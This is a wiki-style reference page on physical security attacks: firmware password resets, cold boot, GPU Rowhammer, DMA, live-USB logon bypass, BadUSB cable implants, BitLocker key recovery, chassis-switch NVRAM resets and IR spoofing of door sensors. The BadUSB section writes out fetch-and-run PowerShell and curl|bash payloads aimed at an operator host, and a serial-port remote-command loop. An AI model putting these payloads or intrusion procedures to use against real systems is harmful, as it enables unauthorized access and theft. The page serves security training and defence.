# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

Legacy PC firmware settings may be reset by disconnecting the CMOS battery or using a documented clear-CMOS jumper. The necessary power-off time is board-specific, and modern UEFI passwords or keys may live in nonvolatile flash, an embedded controller, or a security device and therefore survive a battery removal. Consult the board/service manual before shorting pins; this procedure can also invalidate TPM measurements and trigger disk-encryption recovery.

On legacy x86 systems, tools such as **killCMOS** and **CmosPwd** can inspect or alter CMOS-backed settings from a bootable environment. CmosPwd recognizes password formats from a documented set of older BIOS families and can back up, restore, or erase/kill CMOS state; its published builds target legacy DOS/Windows, Linux, FreeBSD, and NetBSD environments.<sup>[[18]](#references)</sup> These utilities are not generic UEFI password removers and require sufficient hardware/firmware access.

Some laptop firmware displays a vendor-specific challenge code after several failed password attempts. Databases such as [bios-pw.org](https://bios-pw.org) can derive legacy vendor recovery passwords for some models, but many systems implement lockout without a derivable challenge. Treat any generated password as model-specific and avoid exhausting permanent attempt counters.

### UEFI Security

For modern **UEFI** systems, CHIPSEC can audit Secure Boot variable protections. Start with the non-modifying check below; the optional `-a modify` mode deliberately attempts to corrupt variables and should be used only on a recoverable lab system. CHIPSEC itself warns that its privileged driver and low-level hardware access are unsuitable for production endpoints.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analysis and Cold Boot Attacks

DRAM does not lose every bit immediately when refresh stops. The decay rate varies substantially with module technology and temperature; cooling can preserve useful data for far longer than an uncooled power cycle. A cold-boot attack rapidly reboots into a small acquisition environment or transfers a cooled module, captures raw memory, and reconstructs cryptographic keys despite bit decay. A disk-copy utility is not automatically a physical-memory imager, and Volatility analyzes a capture rather than acquiring it; use a platform-appropriate, validated acquisition tool.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Against Page Tables

Modern GPU Rowhammer attacks become much more useful when they target **GPU virtual-memory metadata** instead of ordinary buffers. Recent work on **GDDR6 NVIDIA Ampere GPUs** shows that an attacker running unprivileged CUDA code can build GPU-specific hammering patterns, use **memory massaging** to place paging structures in vulnerable rows, and then flip bits in the **last-level page table** or an intermediate **page directory**. Once a single translation entry is corrupted, the attacker can bootstrap **arbitrary GPU memory read/write** and then pivot into host compromise.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** in GDDR6 and build refresh-aware / non-uniform hammering patterns that bypass in-DRAM mitigations.
2. **Massage GPU allocations** so the driver places page-translation structures in hammerable physical locations instead of keeping them in the default protected pool. In practice this can mean exhausting the low-memory page-table region and spraying large sparse UVM mappings with controlled strides.
3. **Flip translation metadata** such as **PFN** or aperture-related bits inside a page-table / page-directory entry so the attacker-controlled virtual page resolves to page-table pages, arbitrary GPU memory, or host-visible system mappings.
4. Reuse the forged mapping to rewrite additional translation entries and escalate into **arbitrary GPU memory read/write** across GPU contexts.

### Host Pivot and Mitigations

- With **IOMMU disabled**, forged system-aperture mappings can expose arbitrary **host physical memory** to the GPU, turning the GPU primitive into full host compromise.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** targets last-level page-table entries, while **GeForge** shows that corrupting a page-directory level can be easier because one bit flip can retarget a larger translation subtree. Do not treat only one paging layer as security-critical.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** still matters because it blocks the direct arbitrary-host-memory path used by GDDRHammer/GeForge, but it is **not a complete mitigation**. **GPUBreach** shows a second-stage pivot where the attacker corrupts GPU-writable, driver-owned CPU buffers and then triggers NVIDIA driver memory-safety bugs to obtain a kernel write primitive and a **root shell** even with IOMMU enabled.<sup>[[3]](#references)</sup>
- **System-level ECC** is a practical hardening step on supported workstation/server GPUs. Consumer GPUs without ECC expose a weaker defense surface.<sup>[[4]](#references)</sup>
- These attacks are not purely theoretical: **GeForge** reported **1,171** bit flips on an RTX 3060 and **202** on an RTX A6000, which was enough to build a working host-privilege-escalation chain.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**Inception** demonstrates **DMA-based memory acquisition and patching** over interfaces such as FireWire and early Thunderbolt configurations, including historical login-bypass signatures. It is not simply “ineffective against Windows 10”: exploitability depends on the interface, target build, IOMMU policy, lock state, and whether Windows Kernel DMA Protection is supported and enabled. Windows 10 version 1803 and later introduced Kernel DMA Protection on compatible platforms, substantially changing the attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB for System Access

On an unencrypted or already-unlocked Windows volume, an offline environment can replace accessibility binaries such as **sethc.exe** or **Utilman.exe** with **cmd.exe**, yielding a SYSTEM command prompt when the corresponding logon-screen shortcut runs. Tools such as **chntpw** can edit local SAM account data. These methods do not bypass a locked BitLocker volume and can damage credentials protected with DPAPI/EFS; preserve forensic copies and backups.

**Kon-Boot** is a commercial boot-time authentication-bypass tool for supported Windows/macOS configurations. Compatibility depends on the OS, firmware mode, Secure Boot, and disk-encryption setup; it does not decrypt a BitLocker-locked volume.<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Delete/Supr**, F2, F10, or another vendor key may open firmware setup.
- **F8** enters legacy Windows advanced boot options only on configurations where that path remains enabled; current recovery entry varies.
- Holding **Shift** can suppress Windows automatic logon in some configurations, although policy/registry settings can disable that behavior.<sup>[[17]](#references)</sup>

### BAD USB Devices

Devices such as **USB Rubber Ducky** and Teensy boards can enumerate as trusted HID keyboards and inject predefined keystrokes. The payload initially has the privileges and desktop access of the logged-on session; UAC prompts, screen locking, keyboard layout, timing, and endpoint USB policy still constrain it.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator or backup privileges can create a shadow copy or save registry hives so locked files such as **SAM** and **SYSTEM** can be acquired. This is a post-compromise collection technique, not a privilege bypass, and should be correlated with `diskshadow`/VSS and registry-hive export events.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants such as **Evil Crow Cable Wind** hide inside USB-A→USB-C or USB-C↔USB-C cables, enumerate purely as a USB keyboard, and expose their C2 stack over Wi-Fi. The operator only needs to power the cable from the victim host, create a hotspot named `Evil Crow Cable Wind` with password `123456789`, and browse to [http://cable-wind.local/](http://cable-wind.local/) (or its DHCP address) to reach the embedded HTTP interface.<sup>[[8]](#references)</sup>
- The browser UI provides tabs for *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, and *Config*. Stored payloads are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered to mimic known peripherals.
- Because the C2 lives inside the cable, a phone can stage payloads, trigger execution, and manage Wi-Fi credentials without using the organization's network—useful for short dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules bind one or more payloads to fire immediately after USB enumeration. The implant performs lightweight OS fingerprinting and selects the matching script.
- Example workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Because execution is unattended, simply swapping a charging cable can achieve “plug-and-pwn” initial access under the logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** A stored payload opens a console and pastes a loop that executes whatever arrives on the new USB serial device. A minimal Windows variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** The implant keeps the USB CDC channel open while its ESP32-S3 launches a TCP client (Python script, Android APK, or desktop executable) back to the operator. Any bytes typed into the TCP session are forwarded into the serial loop above, giving remote command execution even on air-gapped hosts. Output is limited, so operators typically run blind commands (account creation, staging additional tooling, etc.).

### HTTP OTA update surface

- The documented Evil Crow Cable Wind interface exposes an unauthenticated firmware-update endpoint at `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

An authorized forensic acquisition of a live or recently running system may contain a BitLocker volume master key or related key material while the volume is unlocked. Commercial tools such as Elcomsoft Forensic Disk Decryptor and Passware Kit Forensic can search supported memory images, hibernation files, or crash dumps, but success is not guaranteed. Modern Windows also encrypts crash dumps when BitLocker is enabled, and a stored 48-digit recovery password is a different artifact from an in-memory volume key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering for Recovery Key Addition

An attacker who persuades an administrator to run BitLocker-management commands can add a recovery-password, external-key, or other protector and then capture it. A recovery password cannot be an arbitrary string of zeros: BitLocker numerical recovery passwords have a validated 48-digit format. The relevant authorized-administration syntax is `manage-bde -protectors -add C: -recoverypassword`; list the resulting protectors with `manage-bde -protectors -get C:`. Monitor protector additions and ensure new recovery material is escrowed only to approved locations.<sup>[[16]](#references)</sup>

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Many modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the switch is toggled in a specific pattern.<sup>[[5]](#references)[[6]](#references)</sup>

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On the next boot, affected models load reset firmware state. Depending on the vendor and revision, the cleared state may include a supervisor password, custom boot settings, or enrolled Secure Boot keys; TPM state and disk-encryption effects must be assessed separately.

> A firmware reset may restore external-boot options, but it does **not** decrypt storage. BitLocker or another full-disk encryption system can enter recovery after TPM/firmware changes and still protect the internal drive without a recovery key.<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **nothing but a screwdriver**.<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. Power-on or suspend-resume the target so the EC is running.
2. Remove the bottom cover to expose the intrusion/maintenance switch.
3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
4. Reassemble and reboot, then inspect which firmware settings and credentials actually changed.
5. If authorized and external boot is available, boot a controlled live image. Once an internal volume is legitimately unlocked (or if it was never encrypted), the live environment can acquire credentials and data or inspect the EFI System Partition. Modifying that partition to install an EFI implant is persistent and highly intrusive, and remains constrained by Secure Boot, measured boot, firmware write protection, and endpoint monitoring. Encrypted storage remains inaccessible without its key or recovery material.

### Detection & Mitigation

* Log chassis-intrusion events in the OS management console and correlate with unexpected BIOS resets.
* Employ **tamper-evident seals** on screws/covers to detect opening.
* Keep devices in **physically controlled areas**; assume that physical access equals full compromise.
* Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation for NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).<sup>[[7]](#references)</sup>
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)

{{#include ../banners/hacktricks-training.md}}
